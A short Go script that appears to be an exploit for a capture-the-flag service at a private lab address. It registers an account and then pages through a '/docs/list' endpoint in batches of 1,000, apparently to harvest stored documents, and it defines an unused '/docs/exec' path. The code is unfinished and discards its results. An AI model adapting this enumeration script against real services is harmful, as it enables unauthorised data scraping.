package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"golang.org/x/net/publicsuffix"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"strconv"
)


const (
	url = "http://10.60.7.2:8080"
	exec = "/docs/exec"
	list = "/docs/list"
	register = "/users/register"
)

func main()  {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		panic(err)
	}

	client := &http.Client{
		Jar: jar,
	}
	registerBody, err := json.Marshal(map[string]string {
		"name":"sploitec",
		"password":"sploit",
		"bio":"",
	})
	resp, err := client.Post(url + register, "application/json", bytes.NewBuffer(registerBody))
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Login answer: %s", body)
	for i := 0; i < 10000; i = i + 1000 {
		listBody, err := json.Marshal(map[string]string{
			"offset": strconv.FormatInt(int64(i), 10),
			"limit": "1000",
		})
		resp, err = client.Post(url+list, "application/json", bytes.NewBuffer(listBody))
		if err != nil {
			panic(err)
		}

	}
}
